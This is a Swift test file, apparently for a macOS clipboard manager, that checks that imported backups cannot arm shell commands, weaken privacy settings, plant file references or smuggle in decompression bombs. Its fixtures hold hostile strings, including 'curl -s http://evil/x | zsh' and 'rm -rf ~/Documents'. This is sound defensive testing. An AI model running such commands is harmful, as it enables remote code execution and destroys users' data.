import XCTest
import CryptoKit
@testable import Clipvelope

private struct FixedKeyStore: KeyProviding {
    let key: SymmetricKey
    init(seed: UInt8 = 1) { key = SymmetricKey(data: Data(repeating: seed, count: 32)) }
    func getOrCreateKey() throws -> SymmetricKey { key }
}

/// A backup is a file that arrives from outside. These cover what happens when
/// the file is hostile rather than merely old.
final class ImportHardeningTests: XCTestCase {
    private var root: URL!

    override func setUpWithError() throws {
        root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("clipvelope-harden-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: root)
    }

    private func makeStore(_ name: String = "vault", seed: UInt8 = 1) -> ClipboardStore {
        let storage = EncryptedStorage(directory: root.appendingPathComponent(name),
                                       keyStore: FixedKeyStore(seed: seed))
        let store = ClipboardStore(storage: storage, enableSystemIntegration: false)
        settle(store)
        return store
    }

    private func settle(_ store: ClipboardStore, rounds: Int = 4) {
        for _ in 0..<rounds {
            store.drainPendingWork()
            RunLoop.current.run(until: Date().addingTimeInterval(0.02))
        }
    }

    /// A backup carrying shell Quick Slots and privacy switched off.
    private func hostileState() -> AppState {
        var state = AppState.empty
        state.bindings = [ClipboardBinding(id: UUID(), title: "Email signature",
                                           content: "curl -s http://evil/x | zsh",
                                           isShell: true)]
        state.folders = [CommandFolder(id: UUID(), name: "Handy", items: [
            CommandItem(id: UUID(), title: "Tidy up", content: "rm -rf ~/Documents", isShell: true)
        ])]
        state.skipConcealedContent = false
        return state
    }

    private func writeBackup(_ state: AppState, to url: URL, password: String?,
                             payloads: [String: Data] = [:]) throws {
        let json = try JSONEncoder().encode(VaultSnapshot(state: state, payloads: payloads))
        let sealed: Data
        if let password {
            sealed = try BackupCodec.seal(json, password: password, iterations: 100_000)
        } else {
            sealed = try BackupCodec.seal(json, keychainKey: FixedKeyStore(seed: 1).key)
        }
        try sealed.write(to: url)
    }

    // MARK: - Shell commands from an untrusted backup

    /// A password backup is portable: anyone can produce one. Importing it must
    /// not arm a system-wide hotkey with a shell command.
    func testPortableBackupCannotPlantShellCommands() throws {
        let file = root.appendingPathComponent("hostile.cvb")
        try writeBackup(hostileState(), to: file, password: "pw")

        let store = makeStore()
        store.importBackup(from: file, password: "pw")
        settle(store)

        XCTAssertEqual(store.bindings.count, 1, "the entry is kept, just disarmed")
        XCTAssertFalse(store.bindings[0].isShell)
        XCTAssertFalse(store.folders[0].items[0].isShell)
        XCTAssertEqual(store.bindings[0].content, "curl -s http://evil/x | zsh",
                       "the text is preserved so the user can see what it was")
    }

    func testTheUserIsToldWhenAnImportWasDisarmed() throws {
        let file = root.appendingPathComponent("hostile.cvb")
        try writeBackup(hostileState(), to: file, password: "pw")

        let store = makeStore()
        store.importBackup(from: file, password: "pw")
        settle(store)

        let notice = try XCTUnwrap(store.importNotice)
        XCTAssertTrue(notice.contains("shell command"), notice)
    }

    /// A keychain backup can only have been written by something holding this
    /// Mac's key, so it restores faithfully.
    func testDeviceBoundBackupRestoresShellCommandsIntact() throws {
        let file = root.appendingPathComponent("mine.cvb")
        try writeBackup(hostileState(), to: file, password: nil)

        let store = makeStore()
        store.importBackup(from: file, password: nil)
        settle(store)

        XCTAssertTrue(store.bindings[0].isShell)
        XCTAssertNil(store.importNotice)
    }

    // MARK: - Privacy settings

    func testPortableBackupCannotTurnOffPasswordSkipping() throws {
        let file = root.appendingPathComponent("hostile.cvb")
        try writeBackup(hostileState(), to: file, password: "pw")

        let store = makeStore()
        XCTAssertTrue(store.skipConcealedContent)

        store.importBackup(from: file, password: "pw")
        settle(store)

        XCTAssertTrue(store.skipConcealedContent,
                      "an import must never weaken the privacy settings")
    }

    func testPortableBackupCannotRemoveIgnoredApps() throws {
        let store = makeStore()
        store.ignoreApp(bundleID: "com.1password.1password")
        settle(store)

        var state = AppState.empty
        state.ignoredAppBundleIDs = ["com.example.other"]
        let file = root.appendingPathComponent("b.cvb")
        try writeBackup(state, to: file, password: "pw")

        store.importBackup(from: file, password: "pw")
        settle(store)

        XCTAssertTrue(store.ignoredAppBundleIDs.contains("com.1password.1password"),
                      "the local ignore list must survive an import")
        XCTAssertTrue(store.ignoredAppBundleIDs.contains("com.example.other"),
                      "an import may still add to it")
    }

    // MARK: - File references

    /// The label is derived from the path, so a backup cannot show one filename
    /// and paste a different one.
    func testAFileLabelAlwaysMatchesItsPath() throws {
        let json = #"{"path":"/Users/victim/.ssh/id_rsa","name":"Q3-invoice.pdf"}"#
        let ref = try JSONDecoder().decode(ClipboardContent.FileRef.self, from: Data(json.utf8))

        XCTAssertEqual(ref.path, "/Users/victim/.ssh/id_rsa")
        XCTAssertEqual(ref.name, "id_rsa", "the stored label must be ignored")
    }

    // MARK: - KDF parameters

    func testABackupDemandingTooFewRoundsIsRejected() throws {
        let file = try BackupCodec.seal(Data("{}".utf8), password: "pw", iterations: 1)
        XCTAssertThrowsError(try BackupCodec.open(file, password: "pw")) { error in
            guard case BackupCodec.CodecError.weakKDF = error else {
                return XCTFail("expected weakKDF, got \(error)")
            }
        }
    }

    /// The header sits outside the sealed box, so it is authenticated as
    /// associated data; editing it must invalidate the file.
    func testEditingTheHeaderInvalidatesTheBackup() throws {
        var file = try BackupCodec.seal(Data("{}".utf8), password: "pw", iterations: 100_000)
        // Rewrite the iteration count in place (bytes 6..<10: magic + mode + kdf id).
        let lowered = withUnsafeBytes(of: UInt32(100_001).bigEndian, Array.init)
        file.replaceSubrange(6..<10, with: lowered)

        XCTAssertThrowsError(try BackupCodec.open(file, password: "pw"))
    }

    // MARK: - Backup settings are this Mac's, not the file's

    /// Auto backup writes the whole vault to ~/Documents, which is commonly
    /// cloud-synced. A file the user was told cannot weaken their settings must
    /// not be able to switch that on.
    func testPortableBackupCannotTurnOnAutoBackup() throws {
        let store = makeStore()
        XCTAssertFalse(store.autoBackupEnabled, "precondition")

        var state = AppState.empty
        state.items = [ClipboardItem(text: "hello")]
        state.autoBackupEnabled = true
        state.autoBackupMode = .keychain
        let url = root.appendingPathComponent("autobackup-on.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertFalse(store.autoBackupEnabled,
                       "an untrusted backup must not switch automatic backups on")
    }

    /// The inverse, which needs no hostile intent at all: AppState decodes a
    /// missing field as off, so any ordinary backup would silently retire a
    /// backup the user depends on.
    func testPortableBackupCannotTurnOffOrRetargetAutoBackup() throws {
        let store = makeStore()
        store.autoBackupEnabled = true
        store.autoBackupMode = .password
        settle(store)

        var state = AppState.empty
        state.items = [ClipboardItem(text: "hello")]
        state.autoBackupEnabled = false
        state.autoBackupMode = .keychain
        let url = root.appendingPathComponent("autobackup-off.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertTrue(store.autoBackupEnabled, "the user's own auto-backup choice must survive an import")
        XCTAssertEqual(store.autoBackupMode, .password, "and so must its mode")
    }

    // MARK: - File references from an untrusted backup

    /// A file row hands the paste target the file itself. The paths in someone
    /// else's backup describe their machine; on this one they are either dead
    /// or worth stealing.
    func testPortableBackupCannotPlantFileReferences() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = [
            ClipboardItem(id: UUID(), createdAt: Date(), isPinned: false,
                          content: .files([.init(path: "/Users/victim/Downloads/Q3-report.pdf"),
                                           .init(path: "/Users/victim/.ssh/id_rsa")]),
                          sourceBundleID: nil),
            ClipboardItem(text: "an ordinary snippet"),
        ]
        let url = root.appendingPathComponent("files.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.items.map(\.searchText), ["an ordinary snippet"],
                       "file references from an untrusted backup must not become history rows")
        XCTAssertTrue(store.importNotice?.contains("file reference") ?? false,
                      "and the user must be told, got: \(store.importNotice ?? "nil")")
    }

    /// A backup this Mac's own key sealed is the user's own data, so its file
    /// rows are kept.
    func testDeviceBoundBackupKeepsFileReferences() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = [ClipboardItem(id: UUID(), createdAt: Date(), isPinned: false,
                                     content: .files([.init(path: "/Users/me/notes.txt")]),
                                     sourceBundleID: nil)]
        let url = root.appendingPathComponent("mine.cvb")
        try writeBackup(state, to: url, password: nil)

        store.importBackup(from: url, password: nil)
        settle(store)

        XCTAssertEqual(store.items.count, 1)
    }

    // MARK: - A vault payload is not a backup

    /// Importing a portable backup seals its payloads under the vault key. If a
    /// headerless file still counted as a device-bound backup, the user could be
    /// talked into importing one of those payload files, and it would be applied
    /// with full trust: shell Quick Slots armed, privacy settings obeyed.
    func testAVaultPayloadFileCannotBeImportedAsADeviceBoundBackup() throws {
        let store = makeStore()
        let planted = try JSONEncoder().encode(VaultSnapshot(state: hostileState(), payloads: [:]))
        let id = UUID()

        // Exactly what the import path would write: the attacker's bytes, sealed
        // with this Mac's vault key.
        let storage = EncryptedStorage(directory: root.appendingPathComponent("vault"),
                                       keyStore: FixedKeyStore(seed: 1))
        try storage.writePayload(planted, for: id)

        store.importBackup(from: storage.payloadURL(for: id), password: nil)
        settle(store)

        XCTAssertTrue(store.bindings.isEmpty, "a payload file must not import as a trusted backup")
        XCTAssertNotNil(store.backupFailure, "and the attempt must be reported")
    }

    // MARK: - Payloads inside a backup are input too

    /// Capture refuses a picture whose header declares more pixels than any
    /// decoder should allocate. A backup is the same hostile input: its payload
    /// is decoded later to draw the row's thumbnail.
    func testAnImportedImageDeclaringTooManyPixelsIsLeftOut() throws {
        let store = makeStore()
        let id = UUID()
        var state = AppState.empty
        state.items = [
            ClipboardItem(id: id, createdAt: Date(), isPinned: false,
                          content: .image(.init(pixelWidth: 2, pixelHeight: 2,
                                                byteCount: 120, typeIdentifier: "public.png")),
                          sourceBundleID: nil),
            ClipboardItem(text: "an ordinary snippet"),
        ]
        let bomb = compressiblePNG(width: 9000, height: 9000)
        let url = root.appendingPathComponent("bomb.cvb")
        try writeBackup(state, to: url, password: "pw", payloads: [id.uuidString: bomb])

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.items.map(\.searchText), ["an ordinary snippet"],
                       "the decompression bomb must not become a history row")
    }

    func testAnImportedPayloadThatIsNotWhatItsItemClaimsIsLeftOut() throws {
        let id = UUID()
        let image = ClipboardContent.image(.init(pixelWidth: 2, pixelHeight: 2,
                                                 byteCount: 10, typeIdentifier: "public.png"))
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(Data("not a png".utf8), for: image))
        XCTAssertTrue(ClipboardStore.payloadIsAcceptable(compressiblePNG(width: 4, height: 4), for: image))

        let rich = ClipboardContent.richText(.init(plainText: "hi", byteCount: 2, typeIdentifier: "public.rtf"))
        XCTAssertTrue(ClipboardStore.payloadIsAcceptable(Data("{\\rtf1}".utf8), for: rich))
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(
            Data(count: ClipboardContent.RichTextInfo.maxBytes + 1), for: rich))

        // Neither of these keeps a payload file at all.
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(Data([1]), for: .text("x")))
        XCTAssertFalse(ClipboardStore.payloadIsAcceptable(Data([1]), for: .files([.init(path: "/tmp/x")])))
        _ = id
    }

    // MARK: - What one backup may install

    func testAnImportIsCappedSoAPinnedFloodCannotGrowTheVaultForever() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = (0..<(ClipboardStore.maxImportedItems + 50)).map {
            ClipboardItem(id: UUID(), createdAt: Date(), isPinned: true,
                          content: .text("entry \($0)"), sourceBundleID: nil)
        }
        let url = root.appendingPathComponent("flood.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.items.count, ClipboardStore.maxImportedItems)
    }

    func testAnOversizedEntryIsLeftOutOfAnImport() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = [
            ClipboardItem(text: String(repeating: "x", count: ClipboardMonitor.maxTextBytes + 1)),
            ClipboardItem(text: "keep me"),
        ]
        let url = root.appendingPathComponent("huge.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.items.map(\.searchText), ["keep me"])
    }

    func testABackupWithDuplicateBindingIDsImportsWithoutDuplicates() throws {
        let store = makeStore()
        let id = UUID()
        var state = AppState.empty
        state.items = [ClipboardItem(text: "x")]
        state.bindings = [
            ClipboardBinding(id: id, title: "first", content: "a", isShell: false),
            ClipboardBinding(id: id, title: "second", content: "b", isShell: false),
        ]
        let url = root.appendingPathComponent("dupe-bindings.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertEqual(store.bindings.map(\.title), ["first"])
    }

    /// Losing a Quick Slot silently is indistinguishable from the feature
    /// breaking, which is the rule this codebase sets for itself.
    func testAnImportSaysWhenItLeavesQuickSlotsOut() throws {
        let store = makeStore()
        var state = AppState.empty
        state.items = [ClipboardItem(text: "x")]
        state.bindings = [ClipboardBinding(
            id: UUID(), title: "huge",
            content: String(repeating: "x", count: ClipboardMonitor.maxTextBytes + 1),
            isShell: false)]
        let url = root.appendingPathComponent("fat-binding.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        XCTAssertTrue(store.bindings.isEmpty)
        XCTAssertTrue(store.importNotice?.contains("Quick Slot") ?? false,
                      "got: \(store.importNotice ?? "nil")")
    }

    /// A per-entry cap does not bound a total. Many entries each just under the
    /// limit still tax every future copy, because all of it is re-encrypted on
    /// each one.
    func testTheTotalInlineTextAnImportMayInstallIsBounded() throws {
        let store = makeStore()
        var state = AppState.empty
        let oneMB = String(repeating: "x", count: 1024 * 1024)
        state.items = (0..<200).map { _ in ClipboardItem(text: oneMB) }
        let url = root.appendingPathComponent("aggregate.cvb")
        try writeBackup(state, to: url, password: "pw")

        store.importBackup(from: url, password: "pw")
        settle(store)

        let total = store.items.reduce(0) { $0 + $1.searchText.utf8.count }
        XCTAssertLessThanOrEqual(total, ClipboardStore.maxImportedInlineBytes)
        XCTAssertGreaterThan(store.items.count, 0, "but a reasonable prefix still imports")
    }

    // MARK: - The retired backup format

    /// Pre-release builds wrote headerless files. They are refused now, and the
    /// message must say why rather than blame the password.
    func testAPreReleaseBackupSaysSoRatherThanBlamingThePassword() throws {
        let store = makeStore()
        let headerless = try XCTUnwrap(
            AES.GCM.seal(Data(#"{"items":[]}"#.utf8), using: FixedKeyStore(seed: 1).key).combined)
        let url = root.appendingPathComponent("pre-release.cvb")
        try headerless.write(to: url)

        store.importBackup(from: url, password: nil)
        settle(store)

        XCTAssertTrue(store.backupFailure?.contains("pre-release") ?? false,
                      "got: \(store.backupFailure ?? "nil")")
    }

    // MARK: - Duplicate ids

    /// The panel indexes rows by id with an initializer that traps on a
    /// duplicate. A backup is a file, and a file can say anything.
    func testABackupWithDuplicateItemIDsImportsWithoutDuplicates() throws {
        let store = makeStore()
        let id = UUID()
        var state = AppState.empty
        state.items = [
            ClipboardItem(id: id, createdAt: Date(), isPinned: false, content: .text("first"), sourceBundleID: nil),
            ClipboardItem(id: id, createdAt: Date(), isPinned: false, content: .text("second"), sourceBundleID: nil),
            ClipboardItem(id: UUID(), createdAt: Date(), isPinned: false, content: .text("third"), sourceBundleID: nil),
        ]
        let url = root.appendingPathComponent("dupes.cvb")
        try writeBackup(state, to: url, password: nil)

        store.importBackup(from: url, password: nil)
        settle(store)

        XCTAssertEqual(store.items.map(\.searchText), ["first", "third"])
        XCTAssertEqual(Set(store.items.map(\.id)).count, store.items.count)
    }

    func testRemovingDuplicateIDsKeepsTheFirstOccurrence() {
        let id = UUID()
        let items = [
            ClipboardItem(id: id, createdAt: Date(), isPinned: false, content: .text("a"), sourceBundleID: nil),
            ClipboardItem(id: id, createdAt: Date(), isPinned: true, content: .text("b"), sourceBundleID: nil),
        ]
        XCTAssertEqual(items.removingDuplicateIDs().map(\.searchText), ["a"])
        XCTAssertEqual([ClipboardItem]().removingDuplicateIDs(), [])
    }
}
